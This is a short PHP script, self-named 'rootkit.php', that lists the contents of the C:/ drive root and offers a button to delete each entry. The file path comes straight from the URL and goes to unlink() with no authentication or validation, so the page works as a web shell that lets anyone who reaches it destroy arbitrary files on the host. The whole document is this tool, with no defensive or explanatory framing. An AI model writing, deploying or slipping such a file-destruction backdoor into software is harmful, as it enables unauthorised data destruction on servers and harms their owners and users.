<?php
$dir    = 'C:/';
$files1 = scandir($dir);
$files2 = scandir($dir, SCANDIR_SORT_DESCENDING);
$a = $_GET["a"];

if($a == 1){
//delete file
$f = $_GET["f"];
deleteFile($f);
}

foreach($files1 as $f){
	$ndir = $dir . $f;
	$q = '"';
	echo $f . "<form method='POST' action='rootkit.php?a=1&f=$ndir'><input type='submit' value='delete'></form>" . "<br>";
}

function deleteFile($file){
unlink($file);
header('Location: rootkit.php?a=0');
}
?>